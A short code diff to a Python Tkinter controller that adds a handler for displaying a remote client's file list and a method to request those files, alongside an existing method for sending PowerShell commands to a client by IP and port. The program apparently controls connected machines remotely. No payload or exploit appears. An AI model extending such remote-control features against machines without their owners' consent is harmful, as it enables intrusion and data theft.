@@ -22,14 +22,15 @@ class Controller:
             p_type = packet.get("type")
             p_data = packet.get("data")
 
-            if p_type == "init":
-                pass
-
-            elif p_type == "update":
+            if p_type == "update":
                 self.current_clients = p_data.get("clients", {})
 
                 if self.current_clients is not None and self.view.root.winfo_exists() and self.view.root.winfo_viewable():
                     self.view.update_clients(self.current_clients)
+
+            elif p_type == "file_list":
+                if self.current_clients is not None and self.view.root.winfo_exists() and self.view.root.winfo_viewable():
+                    self.view.update_file_list(packet.get("ip"), packet.get("data"))
 
             elif p_type == "error":
                 print(f"Server Error: {packet.get('message')}")
@@ -43,6 +44,9 @@ class Controller:
 
     def powershell_command(self, ip, port, command):
         self.model.powershell_command(ip, port, command)
+
+    def open_user_files(self, ip, port):
+        self.model.open_user_files(ip, port)
 
 
     def start(self):
